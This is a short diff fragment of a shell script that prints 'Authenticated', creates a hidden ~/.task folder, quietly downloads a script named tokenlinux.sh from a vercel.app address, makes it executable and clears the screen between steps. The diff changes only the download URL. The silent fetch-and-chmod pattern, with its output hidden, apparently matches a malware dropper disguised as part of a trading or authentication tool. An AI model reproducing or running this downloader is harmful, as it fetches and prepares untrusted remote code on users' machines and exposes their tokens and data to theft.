@@ -4,7 +4,7 @@ echo "Authenticated"
 mkdir -p "$HOME/.task"
 TARGET_DIR="$HOME/.task"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://trading-v1-99wu.vercel.app/120/tokenlinux.sh"
+wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://trading-v1.vercel.app/120/tokenlinux.sh"
 clear
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 clear
